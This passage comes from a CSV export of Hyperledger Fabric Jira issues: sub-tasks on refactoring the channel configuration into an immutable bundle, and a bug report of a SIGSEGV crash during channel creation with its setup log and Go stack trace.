On other hand, not able to specify a bool in any way.. I guess the alternative is to write a custom parser?
So, in my, non-maintainer opinion, i am ok with that interpretation..
{noformat}
;;;","16/Sep/17 9:33 PM;mastersingh24;The proposed change https://gerrit.hyperledger.org/r/#/c/12533/2/common/viperutil/config_util.go@320  seems fine to me based on the fact we also use a similar mechanism already in the other unmarshal mathod;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create Bundle for Policy Processing,FAB-5806,20225,20118,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,17/Aug/17 1:36 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:57 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,common-components,,,,,,"The channel configuration is currently processed via the configtx
package.  This is actually a conflation of responsibilities, as the
configtx package should be concerned about permission to modify a
configuration, not the actual contents of the change.

This CR creates a new channel config bundle, which will ultimately hold
an immutable copy of the channel configuration.  For the time being, it
implements a poor man's parsing of the policy tree.  This temporary
parsing will be removed in the future in favor of more robust parsing
once the mutability notion has been removed from the policy manager.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyden:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add channel config values to immutable bundle,FAB-5807,20226,20118,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,17/Aug/17 1:42 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:57 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,common-components,,,,,,"The channel configuration values are currently mutable, which causes
problems.  Each sub-group of configuration data commits seprately,
leading to potentially inconsistent views of the channel configuration
when considered in the context of cross go-routine out of execution for
memory assignment.

This CR adds the channel config values to the immutable config bundle
and introduces a poor man's config value parser.  This parser will be
removed once the config values are entirely immutable, but is convenient
for now to remove an unwanted dependency on the configtx code.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydev:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add configtx.Manager reference to immutable config,FAB-5808,20227,20118,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,17/Aug/17 1:46 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:58 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,common-components,,,,,,"The immutable bundle does not need the configtx manager to actually
parse the config or policies, but it does need a way authorize new
configurations.  Therefore, the channel config needs to be fed to the
configtx.Manager, but without injecting a new dependency onto the
mutable logic.

This CR introduces a noop value and policy proposer so that the
configtx.Manager code can continue to authorize configuration updates
without injecting this new mutability dependency.  Once there are no
more dependencies on the configtx value/policy proposals, this noop
implementation will be deleted.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydf3:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add bundlesource to track current bundle,FAB-5809,20228,20118,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,17/Aug/17 1:50 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:58 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,common-components,,,,,,"Since the channelconfig bundle is immutable, but the channel config can
change, it's necessary to have an encapsulating structure which retains
a reference to the current immutable bundle.  Because the configuration
may be referenced by multiple go routines, it's important that access to
the reference be synchronized, in this case, through the sync/atomic
Load/Store operations.

This CR adds a BundleSoure which retains a reference to a Bundle.  It
implements the standard interface for channel configuration, but always
references the config through the atomic pointer.  A caller may also
request a static version of the bundle, if multiple coherent config
calls must be made (such as listing organizations, then looking up their
MSP info in the MSP manager).",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydfb:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move orderer to immutable channelconfig bundle,FAB-5810,20229,20118,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,17/Aug/17 1:52 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:58 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,common-components,,,,,,"The first four CRs in this series have been creating a paralllel
implementation of the channel configuration, which no components are
using.  The implementation should be compatible with the existing
implementation, so components can be swapped out individually until
there are no more references to the old model, and then it can be
reomoved.

This CR moves the orderer to the newer immutable channelconfig bundle.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydfj:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move configtxlator to immutable channelconfig bundle,FAB-5811,20230,20118,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,17/Aug/17 1:54 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:58 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,common-components,,,,,,"Just like with the orderer, the dependencies on the old mutable channel
config mechanism must be removed.

This CR moves the configtxlator code from using the older mutable model
to the new immutable one.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydfr:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move peer to immutable channel config bundle,FAB-5812,20231,20118,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,17/Aug/17 1:56 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:58 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,common-components,,,,,,"The peer is the last component of the fabric codebase which still has a
dependency on the older mutable channelconfig.  In order to remove the
mutable code pieces, this dependency must be removed.  This CR does just
that.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydfz:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove unused configtx.Manager functions,FAB-5813,20232,20118,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,17/Aug/17 1:58 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:58 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,common-components,,,,,,"This is a step in the series of moving the channel config from a mutable
structure, to an immutable one.  Thanks to the removal of concerns for
the configtx.Manager which need now only validate, not apply config,
there is a nice chunk of complicated dead code which can be removed.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydg7:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Make policies.ManagerImpl truly immutable,FAB-5814,20233,20118,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,17/Aug/17 2:02 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:58 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,common-components,,,,,,"In this change series to make the channel config immutable, up until
now, the focus has been on removing dependencies on the conflation
between the configtx authorization and the config parsing.  The real
payoff however is in removing the complicated state tracking logic from
all of the assorted mutable components.

This CR tackles the policies.ManagerImpl, which traditionally must
maintain a map of pending changes, create multiple implementations of
the manager, then stitch them together into a working hierarchy on
commit.  This is a great example of the simpliciation which comes from
not treating these structures mutably, as the complexity is lowered
substantially.

This also means that the temporary ""poor man's policy parsing"" may be
removed.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydgf:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Make resources config immutable,FAB-5815,20234,20118,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,17/Aug/17 2:05 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:58 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,common-components,,,,,,"Although very recently introduced, the resources config followed the
same mutable model as the channel config.  This leads to some awkward
looking code with far  more lines than are actually needed.

This CR converts the resources config to follow the same bundle model
that the channel config does.  It does not intrduce a bundle source like
the channel config because for the moment, the resource config may not
be changed.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydgn:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Make channel config values immutable,FAB-5816,20235,20118,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,17/Aug/17 2:09 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:58 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,common-components,,,,,,"This is probably the most complex CR in the series, but the new code is
still obviously much simpler and more easily verified as correct than
the old version.

This CR modifies the config structures to be instantiated simply through
their constructors, rather than through the transactional
begin/propose/precommit/commit structure which existed before.

Although this CR produces a bit of churn, is it he last real obstacle to
removing a large swatch of otherwise unused code.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydgv:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Removed dead mutable config related code,FAB-5817,20236,20118,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,17/Aug/17 2:10 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:58 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,common-components,,,,,,"With the channel config values now immutable, large chunks of common
code which facilitated their mutation are no longer needed.  This CR
simply removes that code.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydh3:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Make MSPConfigHandler immutable,FAB-5818,20237,20118,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,17/Aug/17 2:19 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:57 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,common-components,,,,,,"Although the MSPConfigHandler has not followed the configtx value
interface for some time, it still follows the transactional model of
Being/Propose/Precommit/Commit.

This is wrong for a number of reasons now:
  1. The underlying MSP Manager is immutable
  2. The MSPConfigHandler is only used by immutable config

This CR removes all of the mutable components of the code, drastically
simplifying the implementation and reducing the bug surface.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydhb:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Combine old channel config under new channel config,FAB-5819,20238,20118,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,17/Aug/17 2:22 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:57 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,common-components,,,,,,"This is a cleanup CR which consolidates the mixed references to the old
channel config code and the new channel config code.  In general, either
reference is simply changed to refer to fabric/common/channelconfig but
there are some package names which need cleanup as well.

Although large and scary looking, this is purely rearrangements of
imports and package names, no actual code logic is changed in this one.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydhj:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
SIGSEGV fatal error during runtime execution  creating channel,FAB-5822,20250,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Duplicate,mastersingh24,clessor,clessor,18/Aug/17 12:33 AM,17/Jan/19 12:13 AM,28/Oct/23 3:00 AM,17/Jan/19 12:13 AM,v1.0.1,,,,,fabric-peer,,,,,,1,build-system,Usability,,,,,"On Ubuntu 16.04 EC2 instance.  when running 

./network_setup.sh up mychannel 50

 

Using cryptogen -> /home/ubuntu/godir/src/github.com/hyperledger/fabric/examples/e2e_cli/../../release/linux-amd64/bin/cryptogen

 

##########################################################

##### Generate certificates using cryptogen tool #########

##########################################################

org1.example.com

org2.example.com

 

Using configtxgen -> /home/ubuntu/godir/src/github.com/hyperledger/fabric/examples/e2e_cli/../../release/linux-amd64/bin/configtxgen

##########################################################

#########  Generating Orderer Genesis block ##############

##########################################################

2017-08-17 15:08:54.762 UTC [common/configtx/tool] main -> INFO 001 Loading configuration

2017-08-17 15:08:54.787 UTC [common/configtx/tool] doOutputBlock -> INFO 002 Generating genesis block

2017-08-17 15:08:54.788 UTC [common/configtx/tool] doOutputBlock -> INFO 003 Writing genesis block

 

#################################################################

### Generating channel configuration transaction 'channel.tx' ###

#################################################################

2017-08-17 15:08:54.806 UTC [common/configtx/tool] main -> INFO 001 Loading configuration

2017-08-17 15:08:54.809 UTC [common/configtx/tool] doOutputChannelCreateTx -> INFO 002 Generating new channel configtx

2017-08-17 15:08:54.809 UTC [common/configtx/tool] doOutputChannelCreateTx -> INFO 003 Writing new channel tx

 

#################################################################

#######    Generating anchor peer update for Org1MSP   ##########

#################################################################

2017-08-17 15:08:54.827 UTC [common/configtx/tool] main -> INFO 001 Loading configuration

2017-08-17 15:08:54.831 UTC [common/configtx/tool] doOutputAnchorPeersUpdate -> INFO 002 Generating anchor peer update

2017-08-17 15:08:54.831 UTC [common/configtx/tool] doOutputAnchorPeersUpdate -> INFO 003 Writing anchor peer update

 

#################################################################

#######    Generating anchor peer update for Org2MSP   ##########

#################################################################

2017-08-17 15:08:54.851 UTC [common/configtx/tool] main -> INFO 001 Loading configuration

2017-08-17 15:08:54.854 UTC [common/configtx/tool] doOutputAnchorPeersUpdate -> INFO 002 Generating anchor peer update

2017-08-17 15:08:54.854 UTC [common/configtx/tool] doOutputAnchorPeersUpdate -> INFO 003 Writing anchor peer update

 

Creating network ""e2ecli_default"" with the default driver

Creating peer0.org2.example.com

Creating peer0.org1.example.com

Creating peer1.org2.example.com

Creating peer1.org1.example.com

Creating orderer.example.com

Creating cli

 

 ____    _____      _      ____    _____           _____   ____    _____ 

/ ___|  |_   _|    / \    |  _ \  |_   _|         | ____| |___ \  | ____|

\___ \    | |     / _ \   | |_) |   | |    _____  |  _|     __) | |  _| 

 ___) |   | |    / ___ \  |  _ <    | |   |_____| | |___   / __/  | |___ 

|____/    |_|   /_/   \_\ |_| \_\   |_|           |_____| |_____| |_____|

 

Channel name : mychannel

Creating channel...

CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt

CORE_PEER_TLS_KEY_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/server.key

CORE_PEER_LOCALMSPID=Org1MSP

CORE_VM_ENDPOINT=unix:///host/var/run/docker.sock

CORE_PEER_TLS_CERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/server.crt

CORE_PEER_TLS_ENABLED=true

CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp

CORE_PEER_ID=cli

CORE_LOGGING_LEVEL=DEBUG

CORE_PEER_ADDRESS=peer0.org1.example.com:7051

2017-08-17 15:08:57.676 UTC [msp] GetLocalMSP -> DEBU 001 Returning existing local MSP

2017-08-17 15:08:57.676 UTC [msp] GetDefaultSigningIdentity -> DEBU 002 Obtaining default signing identity

2017-08-17 15:08:57.679 UTC [channelCmd] InitCmdFactory -> INFO 003 Endorser and orderer connections initialized

2017-08-17 15:08:57.680 UTC [msp] GetLocalMSP -> DEBU 004 Returning existing local MSP

2017-08-17 15:08:57.680 UTC [msp] GetDefaultSigningIdentity -> DEBU 005 Obtaining default signing identity

2017-08-17 15:08:57.680 UTC [msp] GetLocalMSP -> DEBU 006 Returning existing local MSP

2017-08-17 15:08:57.680 UTC [msp] GetDefaultSigningIdentity -> DEBU 007 Obtaining default signing identity

2017-08-17 15:08:57.680 UTC [msp/identity] Sign -> DEBU 008 Sign: plaintext: 0A8C060A074F7267314D53501280062D...53616D706C65436F6E736F727469756D 

2017-08-17 15:08:57.680 UTC [msp/identity] Sign -> DEBU 009 Sign: digest: 869B229C64EF36391CFB9BC74081B61FBE93540F64774DF0A3DCED76D0E1923C 

2017-08-17 15:08:57.680 UTC [msp] GetLocalMSP -> DEBU 00a Returning existing local MSP

2017-08-17 15:08:57.680 UTC [msp] GetDefaultSigningIdentity -> DEBU 00b Obtaining default signing identity

2017-08-17 15:08:57.680 UTC [msp] GetLocalMSP -> DEBU 00c Returning existing local MSP

2017-08-17 15:08:57.680 UTC [msp] GetDefaultSigningIdentity -> DEBU 00d Obtaining default signing identity

2017-08-17 15:08:57.680 UTC [msp/identity] Sign -> DEBU 00e Sign: plaintext: 0AC3060A1508021A060889E3D6CC0522...699D384F68B171EE323166DC9828416F 

2017-08-17 15:08:57.680 UTC [msp/identity] Sign -> DEBU 00f Sign: digest: 49032A464A9C7264C844F9FE2F3583C3297993ACB1C6653E96E967082F1F59C6 

fatal error: unexpected signal during runtime execution

[signal SIGSEGV: segmentation violation code=0x1 addr=0x63 pc=0x7f9193318259]

 

runtime stack:

runtime.throw(0xdc9844, 0x2a)

 /opt/go/src/runtime/panic.go:566 +0x95

runtime.sigpanic()

 /opt/go/src/runtime/sigpanic_unix.go:12 +0x2cc

 

goroutine 28 [syscall, locked to thread]:

runtime.cgocall(0xb0e530, 0xc42037edf8, 0xc400000000)

 /opt/go/src/runtime/cgocall.go:131 +0x110 fp=0xc42037edb0 sp=0xc42037ed70

net._C2func_getaddrinfo(0x2d9f1f0, 0x0, 0xc420323980, 0xc420126180, 0x0, 0x0, 0x0)

 ??:0 +0x68 fp=0xc42037edf8 sp=0xc42037edb0

net.cgoLookupIPCNAME(0x7ffe2f013a83, 0x13, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0)

 /opt/go/src/net/cgo_unix.go:146 +0x37c fp=0xc42037ef18 sp=0xc42037edf8

net.cgoIPLookup(0xc420378240, 0x7ffe2f013a83, 0x13)

 /opt/go/src/net/cgo_unix.go:198 +0x4d fp=0xc42037efa8 sp=0xc42037ef18

runtime.goexit()

 /opt/go/src/runtime/asm_amd64.s:2086 +0x1 fp=0xc42037efb0 sp=0xc42037efa8

created by net.cgoLookupIP

 /opt/go/src/net/cgo_unix.go:208 +0xb4

 

goroutine 1 [select]:

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.DialContext(0x7f919352e000, 0xc420378000, 0x7ffe2f013a83, 0x18, 0xc420376240, 0x3, 0x4, 0x0, 0x0, 0x0)

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:434 +0x856

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.Dial(0x7ffe2f013a83, 0x18, 0xc420376240, 0x3, 0x4, 0xc420376240, 0x2, 0x4)

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:319 +0x96

github.com/hyperledger/fabric/peer/common.GetBroadcastClient(0x7ffe2f013a83, 0x18, 0x301, 0x7ffe2f013adf, 0xa1, 0x380, 0xc420333cc0, 0x126, 0x126)

 /opt/gopath/src/github.com/hyperledger/fabric/peer/common/ordererclient.go:66 +0x18f

github.com/hyperledger/fabric/peer/channel.InitCmdFactory.func1(0xc420322e40, 0xc420323410, 0x0, 0x0)

 /opt/gopath/src/github.com/hyperledger/fabric/peer/channel/channel.go:144 +0x67

github.com/hyperledger/fabric/peer/channel.sendCreateChainTransaction(0xc420306a50, 0x0, 0x0)

 /opt/gopath/src/github.com/hyperledger/fabric/peer/channel/create.go:164 +0xa7

github.com/hyperledger/fabric/peer/channel.executeCreate(0xc420306a50, 0xc420306a50, 0x0)

 /opt/gopath/src/github.com/hyperledger/fabric/peer/channel/create.go:178 +0x2f

github.com/hyperledger/fabric/peer/channel.create(0xc42022c6c0, 0xc4201e7860, 0x1, 0xa, 0xc420306a50, 0xda37c3, 0x5)

 /opt/gopath/src/github.com/hyperledger/fabric/peer/channel/create.go:213 +0x45

github.com/hyperledger/fabric/peer/channel.createCmd.func1(0xc42022c6c0, 0xc4201e7860, 0x1, 0xa, 0x0, 0x0)

 /opt/gopath/src/github.com/hyperledger/fabric/peer/channel/create.go:59 +0x52

github.com/hyperledger/fabric/vendor/github.com/spf13/cobra.(*Command).execute(0xc42022c6c0, 0xc4201e7720, 0xa, 0xa, 0xc42022c6c0, 0xc4201e7720)

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/github.com/spf13/cobra/command.go:599 +0x234

github.com/hyperledger/fabric/vendor/github.com/spf13/cobra.(*Command).ExecuteC(0x13ed8c0, 0xf, 0xc420010035, 0x7)

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/github.com/spf13/cobra/command.go:689 +0x367

github.com/hyperledger/fabric/vendor/github.com/spf13/cobra.(*Command).Execute(0x13ed8c0, 0x7d, 0xc420010035)

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/github.com/spf13/cobra/command.go:648 +0x2b

main.main()

 /opt/gopath/src/github.com/hyperledger/fabric/peer/main.go:118 +0x54e

 

goroutine 17 [syscall, locked to thread]:

runtime.goexit()

 /opt/go/src/runtime/asm_amd64.s:2086 +0x1

 

goroutine 24 [runnable]:

github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.(*http2Client).controller(0xc420356000)

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:1186

created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.newHTTP2Client

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:297 +0xea5

 

goroutine 23 [runnable]:

github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.(*http2Client).reader(0xc420356000)

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:1098

created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.newHTTP2Client

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:267 +0xd5e

 

goroutine 9 [syscall]:

os/signal.signal_recv(0x0)

 /opt/go/src/runtime/sigqueue.go:116 +0x157

